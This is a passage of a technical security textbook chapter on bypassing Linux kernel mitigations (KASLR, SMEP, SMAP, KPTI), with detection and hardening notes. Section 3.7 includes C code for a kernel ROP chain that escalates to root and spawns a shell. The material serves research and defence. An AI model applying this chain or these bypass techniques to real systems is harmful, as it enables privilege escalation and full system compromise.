# Domain 6, Chapter 6B — Kernel Mitigation Bypass and Combined Exploit Primitive Chains

> **Scope.** KASLR deep bypass: kernel text, module, and heap derandomization through EntryBleed (CVE-2022-4543), prefetch timing side-channels, branch predictor residuals, eBPF-assisted information leaks, `kptr_restrict` circumvention, per-subsystem pointer leaks via sysfs/procfs/netlink, and real-world kernel information-leak CVEs. SMEP bypass: historical `ret2usr`, kernel ROP chains targeting `native_write_cr4`, page-table manipulation primitives for CR4 bit clearing, and AArch64 PAN as the ARM analogue. SMAP bypass: kernel stack-pivot gadgets, physmap (direct-mapping) spray technique, SMAP-aware ROP chains that stage data via `copy_from_user`/`copy_to_user` gadgets, and userfaultfd/FUSE-based page-fault stalling. KPTI internals: per-CPU trampoline page tables, entry/exit assembly trampolines, remaining kernel-mapped pages in the user page table, interaction with Meltdown (CVE-2017-5754), and residual side-channel exposure. Kernel Address Display Restriction and `kptr_restrict` bypass: `%pK` formatting semantics, per-subsystem leaks that bypass `kptr_restrict`, and sysfs/debugfs exposure. MAC bypass from kernel context: `struct cred` manipulation, `commit_creds(prepare_kernel_cred(0))` as the canonical privilege-escalation primitive, direct `selinux_enforcing` modification, AppArmor profile pointer corruption, and LSM hook table overwrite. Seccomp bypass from kernel context: `TIF_SECCOMP` flag clearing in `thread_info`, `seccomp.mode` field zeroing, BPF filter pointer nullification, and seccomp-notify fd hijacking. Combined exploit primitive chains: the canonical pipeline from information leak through KASLR defeat to arbitrary write to privilege escalation, cross-cache attacks for SLUB freelist isolation bypass, elastic objects (`struct msg_msg`, `struct pipe_buffer`, `struct sk_buff`, `struct seq_operations`, `struct timerfd_ctx`), `modprobe_path` overwrite, core-pattern overwrite, usermodehelper exploitation, and Dirty Pipe (CVE-2022-0847) as a case study in page-cache corruption. Windows kernel mitigations: kASLR, SMEP, SMAP (from Windows 10 21H1), KDP (Kernel Data Protection), VBS (Virtualization-Based Security) architecture, HVCI (Hypervisor-Protected Code Integrity), Kernel CFI, Kernel Shadow Stack (Kernel CET), Secure Kernel, Credential Guard, and PatchGuard/KPP. Windows kernel bypass: HVCI bypass via data-only attacks, KDP bypass through hypervisor vulnerabilities, `_EPROCESS` token manipulation, `_SEP_TOKEN_PRIVILEGES` modification, PatchGuard timing-based evasion, and VBS bypass research. Detection: kernel exploit artifact detection through anomalous privilege transitions, `cred` structure monitoring, crash-dump analysis for kernel ROP artifacts, eBPF-based runtime detection programs, LKRG (Linux Kernel Runtime Guard), audit subsystem signals, Windows kernel exploit detection via PatchGuard, HyperGuard, and ETW kernel-mode tracing.
>
> **Audience.** Kernel exploit developers understanding the constraint landscape, detection engineers writing signatures for kernel-level exploitation artifacts, platform security engineers evaluating kernel hardening configurations, and incident responders analyzing kernel compromise indicators.
>
> **Prerequisites.** Domain 6, Chapter 6A (userspace mitigation bypass — ASLR, DEP, canary, RELRO, CFI bypass). Domain 4, Chapter 4B (hardware-enforced CFI — CET, PAC, MTE in kernel context). Domain 5 (kernel exploitation techniques — SLUB heap spray, cross-cache attacks, elastic objects, subsystem attack surfaces). Domain 2 (page tables, address space layout, syscall dispatch, seccomp, capabilities, namespaces, LSMs). Domain 3 (memory corruption primitives). Domain 7 (speculative execution side-channels for KASLR bypass).

---

## 1. KASLR bypass: deep internals

Chapter 6A introduced KASLR bypass at a surface level — `/proc/kallsyms`, `dmesg` leaks, and a brief mention of hardware side channels. This section examines the mechanics in full depth, covering the specific techniques that matter for modern (6.x) kernels where the obvious leaks have been hardened.

### 1.1 KASLR entropy and randomization regions

Linux kernel ASLR randomizes three independent regions on x86_64. The kernel text base (where `_text` starts) is chosen from a set of aligned positions within the identity-mapped region. Since Linux 5.x, the text randomization window on x86_64 is 1 GiB by default, with the kernel image aligned to a 2 MiB boundary, yielding approximately 9 bits of entropy (512 possible positions). The module region (where `insmod`-loaded modules and BPF JIT code reside) is randomized separately within a 1 GiB window adjacent to the kernel text region. The direct-mapping region (physmap, the linear mapping of all physical memory starting at `PAGE_OFFSET`) is randomized with up to 30 bits of entropy via `CONFIG_RANDOMIZE_MEMORY`.

These relatively modest entropy values — particularly the 9-bit text randomization — mean that KASLR is not a strong barrier against a determined local attacker. It is designed as defense-in-depth, increasing the cost of exploitation rather than preventing it outright.

### 1.2 EntryBleed (CVE-2022-4543)

EntryBleed, disclosed by Will in late 2022, exploits a timing side-channel in the CPU's handling of the `SYSCALL` instruction on Intel processors. When a user-space process invokes `SYSCALL`, the CPU switches to the kernel's `entry_SYSCALL_64` handler. On processors vulnerable to EntryBleed, the CPU's instruction fetch for the kernel entry point creates TLB entries that persist after the syscall returns to user space. By probing user-space addresses that alias with possible kernel text positions (exploiting the fact that the kernel entry point's physical address maps to a predictable user-space virtual address via the physmap), the attacker can detect which TLB entry was populated, thereby inferring the kernel's text base address.

The attack sequence proceeds as follows. The attacker maps a series of user-space pages at addresses that correspond to the set of possible kernel text positions (shifted by the known offset between the identity map and the user address space). Before each probe, the attacker flushes the TLB for the target user-space address. The attacker then executes a syscall, which causes the CPU to fetch instructions from the kernel's entry point and populate TLB entries. After the syscall returns, the attacker accesses each user-space probe address and measures the access time. The address that hits in the TLB (fast access) reveals the kernel text base.

EntryBleed requires local code execution and works on Intel CPUs prior to microcode mitigations. It was assigned CVE-2022-4543 and patched in Linux 6.2 by flushing TLB entries more aggressively on the syscall return path. AMD processors are not affected because their `SYSCALL` implementation handles TLB population differently.

Detection: EntryBleed does not produce any kernel-visible artifact — the probing occurs entirely in user space via timing measurements. The only detection angle is behavioral: a process that executes a large number of syscalls in rapid succession while also probing many user-space pages with high-resolution timing is anomalous. However, this pattern overlaps with legitimate performance-measurement workloads, making reliable detection difficult.

### 1.3 Prefetch-based KASLR bypass

The `PREFETCH` instruction family (`PREFETCHT0`, `PREFETCHT1`, `PREFETCHT2`, `PREFETCHNTA`) loads data into the cache hierarchy without raising page faults or generating exceptions, even for unmapped or privileged addresses. The instruction's execution time, however, varies depending on the state of the page-table walk: if the target virtual address has a valid page-table entry (even one that is supervisor-only and inaccessible from user mode), the prefetch completes the page-table walk and the subsequent timing measurement reflects a "mapped" state. If the address has no valid PTE, the prefetch aborts early.

The attacker iterates through the range of possible kernel text positions, issuing `PREFETCH` at each candidate address and measuring the time. Addresses with valid page-table entries (where the kernel is actually mapped) produce detectably different timings than unmapped addresses. This technique, demonstrated by Gruss et al. (2016) in the "Prefetch Side-Channel Attacks" paper, was effective against KASLR on both Intel and AMD processors.

KPTI (§4) substantially mitigates this attack by removing kernel page-table entries from the user-space page table. When KPTI is active, `PREFETCH` from user space walks the user page table, which does not contain entries for the kernel text region — so the timing side-channel disappears. However, KPTI leaves a small number of kernel pages mapped in the user page table (the entry/exit trampoline, the per-CPU entry area, the interrupt descriptor table), and these residual mappings can leak information about the kernel's overall randomization (§4.3).

### 1.4 Branch predictor-based KASLR bypass

The CPU's branch predictor learns patterns from executed branches, including branches in kernel code executed during syscall handling. The predictor state persists across the user-kernel boundary (this is the same property that enables Spectre v2). The attacker can train the branch predictor with user-space branches at addresses that alias with kernel branch addresses, then execute a syscall (which causes the kernel to execute branches at the real kernel addresses), and finally probe the branch predictor state from user space to determine which kernel addresses were executed.

Evtyushkin et al. demonstrated this in their "Jump Over ASLR" paper (2016): by systematically probing the Branch Target Buffer (BTB) after syscalls, they could identify the addresses of indirect branches in the kernel, thereby determining the kernel text base. The technique requires careful BTB manipulation and precise timing, but it can defeat KASLR in seconds with high reliability.

Mitigations include kernel retpoline (which replaces indirect branches with return-stack-based sequences, changing the BTB pollution pattern), IBRS (Indirect Branch Restricted Speculation, which flushes prediction state on ring transitions), and eIBRS (enhanced IBRS, which provides automatic prediction barrier on privilege changes). On modern CPUs with eIBRS, branch predictor-based KASLR bypass is largely mitigated.

### 1.5 eBPF-assisted KASLR bypass

Unprivileged eBPF (when enabled) provides a powerful KASLR bypass vector because BPF programs execute in kernel context and can interact with kernel data. Several techniques have been demonstrated:

BPF JIT spray: the attacker loads a BPF program whose JIT-compiled output contains useful gadgets at known offsets within the BPF JIT region. The JIT region's base address is randomized, but the attacker knows the program's offset within the JIT allocation. If the attacker can leak any BPF JIT address (e.g., from `/proc/kallsyms` with partial restrictions, or from a separate info-leak bug), they can compute the address of their planted gadgets.

BPF verifier bypass: bugs in the eBPF verifier that allow out-of-bounds reads from BPF maps can leak kernel pointers stored in adjacent kernel memory. Several CVEs have exploited verifier deficiencies for this purpose, including CVE-2021-3490 (eBPF ALU32 bounds tracking), CVE-2022-23222 (pointer arithmetic bounds confusion), and CVE-2023-2163 (verifier precision tracking bypass).

Mitigation: `kernel.unprivileged_bpf_disabled=1` (the default on most hardened distributions since 2022) prevents non-root users from loading BPF programs, eliminating the unprivileged eBPF attack surface. This sysctl is load-bearing for kernel security; enabling unprivileged BPF dramatically expands the kernel's attack surface.

### 1.6 Kernel information-leak CVE examples

Several high-impact CVEs illustrate how kernel information leaks feed into KASLR bypass:

CVE-2017-18344 (`timer_getoverrun` information leak): the `timer_getoverrun` syscall returned an uninitialized `int` value from a stack variable. While the value itself was a 32-bit integer (not a pointer), the surrounding stack frame often contained kernel code pointers from the caller's saved registers. By examining the alignment and structure of the returned value in the context of the kernel's calling convention, researchers demonstrated partial pointer leakage.

CVE-2020-28588 (netlink `nla_strlcpy` leak): a bug in the netlink subsystem's attribute copying caused kernel stack data (including code pointers) to be copied into netlink messages sent to user space. This provided a reliable kernel text pointer leak from any user with netlink socket access.

CVE-2022-0185 (`fsconfig` heap overflow): while primarily a heap-overflow vulnerability (leading to arbitrary write), the initial exploitation step used the overflow to corrupt a heap object's pointer field, which was subsequently leaked back to user space via a `read` on the corrupted object, providing a kernel heap address for KASLR defeat.

The pattern is consistent: KASLR bypass is typically a prerequisite step in a multi-stage kernel exploit, not the primary vulnerability. The attacker chains an information leak (often a separate, less-severe vulnerability) with a corruption primitive (the main vulnerability) to achieve full exploitation.

---

## 2. SMEP bypass

### 2.1 SMEP mechanism

Supervisor Mode Execution Prevention (SMEP) is a CPU feature (Intel: Ivy Bridge and later; AMD: Zen and later; enabled via CR4 bit 20) that prevents the kernel from executing code at user-space virtual addresses. Before SMEP, the simplest kernel exploitation technique was `ret2usr`: corrupt a kernel function pointer or return address to point at shellcode mapped in user space, and the kernel would execute the user-space code at ring 0. SMEP makes this fatal — the CPU raises a page fault with a specific error code (instruction fetch from supervisor-mode page in user-space memory).

### 2.2 ret2usr: historical context

In the pre-SMEP era (kernels before 3.7, hardware before 2013), `ret2usr` was the dominant kernel exploitation technique. The attacker's exploit code in user space:

1. Allocates a page at a known user-space address.
2. Places kernel-mode shellcode in that page (typically `commit_creds(prepare_kernel_cred(0))` followed by a return to user space).
3. Triggers a kernel vulnerability that corrupts a function pointer or return address to point at the user-space shellcode.
4. The kernel executes the user-space shellcode at ring 0, granting the attacker root.

This was extraordinarily reliable: the attacker controlled the shellcode completely (arbitrary code, no gadget constraints), the user-space address was known (no KASLR defeat needed for the shellcode's address), and the only failure mode was the kernel vulnerability itself.

### 2.3 Kernel ROP to native_write_cr4

The first generation of SMEP bypass techniques targeted the CR4 register directly. SMEP is controlled by bit 20 of CR4; clearing this bit disables SMEP. The attacker constructs a kernel ROP chain (using kernel gadgets, which requires KASLR defeat) that:

1. Loads CR4's current value (via a `mov rax, cr4`-type gadget, or by reading the known CR4 value from a kernel global variable like `this_cpu_read(cpu_tlbstate.cr4)`).
2. Clears bit 20 (SMEP) using an `and` or `xor` gadget.
3. Writes the modified value back to CR4 via a `mov cr4, rax` gadget (specifically, `native_write_cr4` or an inlined equivalent).
4. After CR4 is modified, the ROP chain pivots to the attacker's user-space shellcode via a `ret` or `jmp` to a user-space address.

The critical gadget is `native_write_cr4`, the kernel function that writes CR4. It is present in every Linux kernel build and is typically callable via its symbol address (obtainable after KASLR defeat). However, modern kernels (5.3+) added CR4 pinning: `native_write_cr4` checks the new value against a pinned mask and restores the pinned bits, preventing SMEP/SMAP from being cleared. This is enforced by `cr4_update_bootflags()` during boot and by checks in `native_write_cr4` itself.

The attacker's response: bypass the check by calling `mov cr4, rax` inline (a raw `CR4` write gadget) rather than going through `native_write_cr4`. The raw instruction `0F 22 E0` (`mov cr4, rax`) appears in various kernel code paths, and gadgets containing it can be found in the kernel text. However, with kernel CET IBT (Domain 4B §1.4), such gadgets must begin with `ENDBR64` to be reachable via indirect branches — significantly reducing the available gadget set.

### 2.4 Page-table manipulation for SMEP bypass

An alternative to modifying CR4 is to manipulate the page tables so that the attacker's user-space shellcode page appears to be a kernel-mode page. The attacker uses a kernel write primitive to modify the Page Table Entry (PTE) for their user-space shellcode page, clearing the User/Supervisor bit (bit 2 of the PTE). With this bit cleared, the CPU treats the page as a supervisor-mode page, and SMEP does not apply. The kernel then fetches instructions from what was user-space memory, but the CPU sees it as supervisor-mode memory.

Prerequisites: the attacker needs an arbitrary kernel write primitive (to modify the PTE) and knowledge of the PTE's physical or virtual address. Locating the PTE requires either walking the page table from CR3 (which requires reading kernel memory) or using a known kernel function that performs the walk (`lookup_address` or the `__va`/`__pa` macros on the direct mapping).

This technique is more complex than CR4 modification but bypasses CR4 pinning entirely. It has been used in real-world exploits, including the "Full Nelson" exploit series.

### 2.5 SMEP on AArch64: PAN (Privileged Access Never)

ARM's analogue to SMEP is PAN (Privileged Access Never), introduced in ARMv8.1-A. PAN prevents the kernel from accessing (reading or writing, not just executing) user-space memory. PAN is controlled by the PSTATE.PAN bit, and the kernel is expected to clear PAN only when it intentionally accesses user memory (via `copy_to_user`/`copy_from_user`, which use `LDTR`/`STTR` instructions that bypass PAN, or explicitly clear and re-set the PAN bit).

PAN is strictly stronger than SMEP: SMEP prevents execution only, while PAN prevents all access. This makes `ret2usr` and user-space data staging both impossible under PAN, forcing the attacker to operate entirely within kernel memory.

PAN bypass: the attacker can clear the PSTATE.PAN bit via a gadget that writes to PSTATE (e.g., a `MSR` instruction), or by corrupting the saved PSTATE value in the kernel's exception stack frame (so that when the kernel returns from an exception, PAN is cleared). ARM Software PAN (used on ARMv8.0 cores that lack hardware PAN) is weaker: it uses TTBR0 (the user page-table base register) as a gating mechanism, setting TTBR0 to a reserved value that faults on user-space access. An attacker who can modify TTBR0 defeats software PAN.

---

## 3. SMAP bypass

### 3.1 SMAP mechanism

Supervisor Mode Access Prevention (SMAP, Intel Broadwell+, AMD Zen+; CR4 bit 21) prevents the kernel from reading or writing user-space memory when SMAP is set. The kernel uses the `STAC` (Set AC flag) and `CLAC` (Clear AC flag) instructions to temporarily disable SMAP during legitimate user-space access in `copy_from_user`/`copy_to_user`. When SMAP is active, any attempt by the kernel to dereference a user-space pointer raises a page fault.

SMAP defeats a critical exploitation pattern: placing a fake kernel structure (e.g., a fake `struct cred`, a fake vtable, or a pivot target) in user-space memory and tricking the kernel into using it. Before SMAP, the attacker could allocate a fake structure at a known user-space address and corrupt a kernel pointer to reference it. With SMAP, the kernel faults when it tries to access the user-space fake structure.

### 3.2 Kernel stack pivoting

If the attacker can corrupt a kernel stack pointer (RSP), they can pivot the kernel's stack to a memory region they control. Before SMAP, this region could be in user space; with SMAP, it must be in kernel space. The attacker needs a kernel-space region with attacker-controlled content — the physmap (direct mapping) is the primary candidate.

A stack-pivot gadget in the kernel takes the form: `xchg rsp, rax; ret` or `mov rsp, [rdi]; ret` or `leave; ret` (which sets RSP = RBP, then pops RBP). The attacker sets the source register/memory to point at their controlled kernel-space buffer, pivoting the stack and beginning a kernel ROP chain from the controlled buffer.

Stack-pivot gadgets are common in the kernel text because function epilogues naturally contain `leave; ret` sequences. The constraint is controlling the register that feeds into the pivot, which depends on the specific kernel vulnerability and the calling convention at the corruption point.

### 3.3 Physmap spray (direct-mapping abuse)

The kernel's direct mapping (physmap, starting at `PAGE_OFFSET` on x86_64) maps all physical memory into the kernel's virtual address space. When a user-space process allocates memory (via `mmap`, heap allocation, etc.), the underlying physical pages are also accessible through the physmap. The attacker can:

1. Spray user-space memory with a controlled pattern (e.g., a sequence of kernel ROP gadget addresses).
2. Determine the physmap address of the sprayed pages (the physmap offset is randomized by `CONFIG_RANDOMIZE_MEMORY`, but once KASLR is defeated, the offset is known; alternatively, a kernel info leak that reveals any physmap pointer suffices).
3. Use the physmap address as the target for a kernel stack pivot or as the location of fake kernel structures.

The physmap spray is the standard SMAP bypass for data staging: the attacker places controlled data in user-space buffers, then references the same data through the physmap virtual address (which is a kernel-space address and thus not subject to SMAP). This technique is used in virtually every modern Linux kernel exploit on x86_64.

Mitigation: `CONFIG_RANDOMIZE_MEMORY` (randomizes the physmap base, requiring KASLR defeat first), Xen PV domains (where the physmap doesn't exist or is differently structured), and proposed patches to make the physmap non-executable (currently it is typically mapped RWX on many configurations, though `CONFIG_STRICT_KERNEL_RWX` addresses the executable aspect of the kernel text, the physmap itself remains read-write).

### 3.4 SMAP-aware ROP chains

Modern kernel ROP chains operate entirely in kernel space. The attacker's chain calls kernel functions that perform the desired operations, with controlled arguments supplied via `pop reg; ret` gadgets. The chain stages data in the physmap (controlled via user-space writes before the exploit triggers) and references it via physmap addresses throughout.

A typical SMAP-aware ROP chain for privilege escalation:
1. `pop rdi; ret` → address of `init_cred` (the root credential structure, known after KASLR defeat).
2. `commit_creds` → sets the current task's credentials to root.
3. `swapgs; iretq` (or `KPTI trampoline`) → return to user space with elevated privileges.

The chain never touches user-space memory directly: `init_cred` is in the kernel's `.data` section, `commit_creds` is a kernel function, and the return to user space uses kernel-provided entry/exit mechanisms. SMAP is irrelevant because all data access is within kernel address ranges.

### 3.5 userfaultfd and FUSE-based page-fault stalling

Before SMAP, the attacker could place fake kernel structures in user-space memory and control when the kernel accesses them by manipulating page availability. Two mechanisms enable this control even with SMAP-aware exploit flows:

**userfaultfd** (`userfaultfd(2)`, available since Linux 4.3) allows a user-space process to handle page faults on its own virtual memory. The attacker registers a userfaultfd handler on a memory region, then triggers a kernel code path that accesses that region via `copy_from_user`. When the kernel touches the faulting page, the kernel thread blocks until the userfaultfd handler responds. This gives the attacker arbitrary control over the timing of kernel execution — the kernel thread is suspended at a known point in a known function, and the attacker can perform other operations (modifying kernel state, winning race conditions) before releasing the page fault.

This is devastating for exploiting kernel race conditions: the attacker can deterministically pause one kernel thread at the exact point where it has acquired a lock or entered a critical section, then trigger the racing operation from another thread. Without userfaultfd, the attacker would need to win a tight timing window through repeated attempts; with it, the window is opened indefinitely.

**FUSE** (Filesystem in Userspace) provides a similar capability: the attacker mounts a FUSE filesystem and triggers a kernel code path that reads from it. The FUSE daemon controls when (and whether) the read completes, providing the same arbitrary-stalling primitive. FUSE-based stalling is more general than userfaultfd (it works with any kernel path that reads files, not just `copy_from_user`) but requires FUSE to be available (typically requires the `fuse` kernel module and `CAP_SYS_ADMIN` or `allow_other` mount option).

Mitigation: `kernel.unprivileged_userfaultfd=0` (default on many hardened distributions since Linux 5.11) restricts userfaultfd to privileged processes, eliminating the unprivileged stalling primitive. FUSE requires `CAP_SYS_ADMIN` for mount, limiting its availability in sandboxed contexts. However, in container environments where unprivileged user namespaces are enabled, an attacker can create a user namespace to obtain `CAP_SYS_ADMIN` within it and mount FUSE — making the FUSE stalling vector available even without host-level privileges.

### 3.6 copy_from_user/copy_to_user gadgets

The kernel functions `copy_from_user` and `copy_to_user` use `STAC`/`CLAC` to temporarily disable SMAP for legitimate user-space access. If the attacker's ROP chain includes a call to `copy_from_user` with controlled arguments, the function disables SMAP, copies data from a user-space address into a kernel buffer, and re-enables SMAP. This gives the attacker a mechanism to pull controlled data from user space into kernel memory as part of the ROP chain.

The gadget sequence: `pop rdi; ret` (kernel destination buffer, typically on the physmap-sprayed region or a known kernel buffer), `pop rsi; ret` (user-space source address, controlled by the attacker), `pop rdx; ret` (size), then call `copy_from_user`. After the call, the kernel buffer contains attacker-controlled data, which can be used by subsequent ROP gadgets.

This is a clean and general-purpose technique for pulling data into kernel space past SMAP. The defense is CR4 pinning (preventing the attacker from clearing SMAP via CR4 modification) combined with kernel CET (preventing the attacker from constructing the ROP chain in the first place).

### 3.7 Kernel ROP chain construction

This section provides a complete working kernel ROP chain that achieves privilege escalation via `commit_creds(prepare_kernel_cred(0))` and returns cleanly to user space through the KPTI trampoline. The code assumes KASLR has been defeated (kernel base address is known) and the attacker has a stack-buffer overflow or other primitive that allows writing a ROP chain to the kernel stack or a pivoted stack region. For companion coverage of userspace ROP, see Chapter 6A.

**User-space setup: saving and restoring register state.**

Before triggering the kernel exploit, the user-space code must save the register state (CS, SS, RFLAGS, RSP, RIP) that will be restored when the ROP chain returns to user space via `iretq` or the KPTI trampoline. Without correct register state, the process crashes on return.

```c
/* save_state / restore_state for x86_64 kernel ROP exploit.
 * These values are pushed onto the iretq frame by the KPTI
 * trampoline's swapgs_restore_regs_and_return_to_usermode path. */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

/* Saved user-space register state */
static unsigned long user_cs, user_ss, user_rflags, user_sp, user_rip;

static void save_state(void)
{
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushfq\n"
        "pop %2\n"
        "mov %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        :
        : "memory"
    );
    /* user_rip is set to the post-exploit landing function address */
}

/* Landing function: executed after the kernel ROP chain returns to user space.
 * At this point, the process should have root credentials. */
static void post_exploit_landing(void)
{
    if (getuid() == 0) {
        printf("[+] Privilege escalation successful (uid=%d)\n", getuid());
        system("/bin/sh");
    } else {
        printf("[-] Exploit failed, still uid=%d\n", getuid());
    }
    exit(0);
}
```

**Gadget finding: stack pivot.**

The first requirement for a kernel ROP chain is controlling RSP. When the vulnerability is a stack buffer overflow, the attacker overwrites saved RBP and the return address directly. For other primitives (e.g., corrupted function pointer), a stack-pivot gadget redirects RSP to attacker-controlled memory.

Common pivot gadgets in the kernel text:

```c
/* Stack pivot gadgets (offsets relative to kernel base).
 * Found via: objdump -d vmlinux | grep -E "xchg.*rsp|mov.*rsp" | head
 * or via ROPgadget --binary vmlinux --re "xchg.*rsp" */

/* xchg rax, rsp; ret  — pivots RSP to value in RAX.
 * Byte sequence: 48 94 c3
 * Useful when the vulnerability gives control of RAX. */
#define GADGET_XCHG_RAX_RSP   (kbase + 0x6e8ae1UL)  /* example offset */

/* mov rsp, [rdi]; ret  — pivots RSP to value pointed by RDI.
 * Useful when the attacker controls a pointer passed as first argument. */
#define GADGET_MOV_RSP_RDI     (kbase + 0x51c1a2UL)  /* example offset */

/* push rax; ... ; pop rsp; ... ; ret  — alternative pivot */
#define GADGET_PUSH_RAX_POP_RSP (kbase + 0x3a2f10UL) /* example offset */
```

**Complete ROP chain array.**

The following array constitutes a full `commit_creds(prepare_kernel_cred(0))` chain with KPTI trampoline return. Each entry is annotated with its purpose.

```c
/* Kernel ROP chain: commit_creds(prepare_kernel_cred(0)) + KPTI return.
 *
 * Gadget offsets are kernel-version-specific. Extract from vmlinux:
 *   ROPgadget --binary vmlinux --ropchain
 *   objdump -d vmlinux | grep "pop rdi"
 *   grep -w prepare_kernel_cred /proc/kallsyms  (if kptr_restrict allows)
 *
 * kbase = leaked kernel text base address (KASLR defeated). */

static void build_rop_chain(unsigned long *chain, unsigned long kbase)
{
    int i = 0;

    /* ---- Stage 1: prepare_kernel_cred(0) ---- */

    /* pop rdi; ret — load RDI = 0 (NULL → create root cred) */
    chain[i++] = kbase + 0x27bbdcUL;   /* pop rdi; ret */
    chain[i++] = 0;                     /* RDI = NULL */

    /* call prepare_kernel_cred — returns new root cred in RAX */
    chain[i++] = kbase + 0x0bbe40UL;   /* prepare_kernel_cred */

    /* ---- Stage 2: move return value RAX → RDI for commit_creds ---- */
    /* There is no single "mov rdi, rax; ret" gadget in most kernels.
     * Common workaround: use a sequence that eventually gets RAX into RDI.
     *
     * Option A: pop rcx; ret  (dummy to absorb prepare_kernel_cred's
     *           stack adjustment if it's a non-leaf function) + cmp-based
     *           gadget. In practice, many kernels have a useful gadget:
     *   mov rdi, rax; ... ; call <something>
     * or we use the "xchg" approach. Here we use a common pattern: */

    /* mov rdi, rax; jne <next>; pop rbx; pop rbp; ret
     * (the jne is not taken because ZF is often set after cmp in
     *  prepare_kernel_cred's epilogue; but this is fragile — verify
     *  per kernel version) */
    chain[i++] = kbase + 0x6586a2UL;   /* mov rdi, rax; cmp ...; jne ...; pop rbx; pop rbp; ret */
    chain[i++] = 0;                     /* dummy for pop rbx */
    chain[i++] = 0;                     /* dummy for pop rbp */

    /* ---- Stage 3: commit_creds(new_cred) ---- */
    chain[i++] = kbase + 0x0bba90UL;   /* commit_creds */

    /* ---- Stage 4: Return to user space via KPTI trampoline ---- */
    /* On KPTI-enabled kernels, we cannot simply do swapgs + iretq because
     * the kernel page table is active. We must use the KPTI return path:
     *   swapgs_restore_regs_and_return_to_usermode
     * This function switches CR3 to the user page table, executes swapgs,
     * and performs iretq. The function expects a specific stack layout:
     *   [rsp+0]  = padding (popped as regs by the trampoline)
     *   [rsp+N]  = RIP (user-space return address)
     *   [rsp+N+8]  = CS
     *   [rsp+N+16] = RFLAGS
     *   [rsp+N+24] = RSP
     *   [rsp+N+32] = SS
     *
     * The exact offset within swapgs_restore_regs_and_return_to_usermode
     * to jump to depends on how many registers the trampoline pops.
     * Typically, jumping to the function + 22 skips the initial register
     * restore and goes directly to the swapgs + CR3 switch + iretq. */
    chain[i++] = kbase + 0x1000f26UL + 22; /* swapgs_restore_regs_and_return_to_usermode + 22 */
    chain[i++] = 0;                     /* padding (dummy for trampoline pop) */
    chain[i++] = 0;                     /* padding (dummy for trampoline pop) */
    chain[i++] = (unsigned long)post_exploit_landing;  /* RIP: user-space landing */
    chain[i++] = user_cs;               /* CS */
    chain[i++] = user_rflags;           /* RFLAGS */
    chain[i++] = user_sp;               /* RSP */
    chain[i++] = user_ss;               /* SS */

    printf("[*] ROP chain built: %d entries, %ld bytes\n", i, i * sizeof(unsigned long));
}
```

**Critical implementation notes.** The `mov rdi, rax` gadget (stage 2) is the most fragile part of the chain. Different kernel builds produce different available gadgets, and the conditional-jump behavior after `prepare_kernel_cred` varies. An alternative approach uses `pop rdi; ret` combined with a separate info leak to determine the return value of `prepare_kernel_cred` before constructing the chain — but this requires two exploit triggers. The KPTI trampoline offset (`+22`) varies by kernel version; on pre-KPTI kernels (< 4.15) or when KPTI is disabled (`nopti` boot parameter), the chain uses a simpler `swapgs; pop rbp; iretq` sequence instead.

On kernels with Kernel CET IBT enabled, all indirect branch targets must begin with `ENDBR64`. The gadgets in this chain must land on `ENDBR64`-prefixed instruction sequences, drastically reducing the available gadget set. On kernels with Kernel CET shadow stack (SHSTK), this entire ROP approach fails because every `ret` instruction validates the return address against the shadow stack — and the attacker's overwritten return addresses will not match. In the CET SHSTK era, data-only attacks (section 6.2, section 8.4) or JOP chains replace ROP entirely.

---

## 4. KPTI: Kernel Page Table Isolation

### 4.1 Mechanism and motivation

KPTI (Kernel Page Table Isolation), merged in Linux 4.15 (January 2018), maintains two separate page tables per CPU: one for kernel mode (containing both kernel and user-space mappings) and one for user mode (containing only user-space mappings plus a minimal set of kernel pages). When the CPU enters user mode, it uses the user page table (which does not map the kernel text, data, or most kernel memory). When the CPU enters kernel mode (via syscall, interrupt, or exception), it switches to the kernel page table, which maps everything.

KPTI was developed as the primary software mitigation for Meltdown (CVE-2017-5754), a speculative execution vulnerability that allowed user-space code to read kernel memory by speculatively accessing kernel-mapped pages and extracting the data through cache side-channels. By removing kernel mappings from the user page table, KPTI prevents Meltdown from finding valid page-table entries for kernel memory, stopping the speculative access at the page-table walk stage.

### 4.2 Entry/exit trampoline design

The switch between page tables occurs in the kernel's entry and exit assembly code (`arch/x86/entry/entry_64.S`). The sequence is intricate because the page-table switch itself requires executing kernel code, but the kernel code is not mapped in the user page table. The solution uses a **trampoline** — a small set of kernel pages that are mapped in both page tables:

**Entry (user → kernel):** the CPU executes `SYSCALL`, which sets RIP to the entry point at `entry_SYSCALL_64`. This entry point is in the trampoline region, which is mapped in the user page table. The trampoline code switches CR3 to the kernel page table (by flipping bit 12 of CR3, which selects between the two PGD entries — a design that avoids a TLB flush by using the PCID feature). After the page-table switch, the full kernel is accessible, and execution transfers to the real syscall handler.

**Exit (kernel → user):** the exit path switches CR3 back to the user page table before executing `SYSRET` or `IRETQ` to return to user space. The CR3 switch is performed in the trampoline code (which is mapped in both page tables), ensuring that the kernel code executing the switch is accessible both before and after the switch.

The per-CPU entry area (containing the trampoline code, the GDT, the IDT pointer, and the TSS) is mapped in both page tables. This is the minimum kernel memory that must be visible to user space for the entry mechanism to function.

### 4.3 Residual kernel mappings and KASLR leakage

KPTI removes most kernel pages from the user page table, but a small set remains mapped:

The per-CPU entry area (trampoline page, a few hundred bytes of code and data). The location of this area leaks information about the kernel's randomization: if the attacker can determine the virtual address of the trampoline page (via a prefetch timing side-channel on the residual mapping), they can compute the kernel text base (the trampoline offset from the text base is fixed). This residual leakage is inherent to KPTI's design — the trampoline must be mapped in user space.

The interrupt descriptor table (IDT): while the IDT itself is mapped in the kernel page table, the IDTR register value (loadable via `SIDT` from user space on older CPUs without UMIP — User-Mode Instruction Prevention) reveals a kernel address. UMIP (Intel Kaby Lake+, AMD Zen+) prevents user-mode execution of `SIDT`, `SGDT`, `SLDT`, `SMSW`, and `STR`, closing this leak.

The vsyscall page (at the fixed address `0xFFFFFFFFFF600000`): still mapped in the user page table on kernels with `vsyscall=emulate` (the default). The vsyscall page is at a known address and does not reveal KASLR information, but it provides three known-address entry points that can serve as limited ROP gadgets (each performs a specific syscall and returns).

### 4.4 KPTI and Meltdown interaction

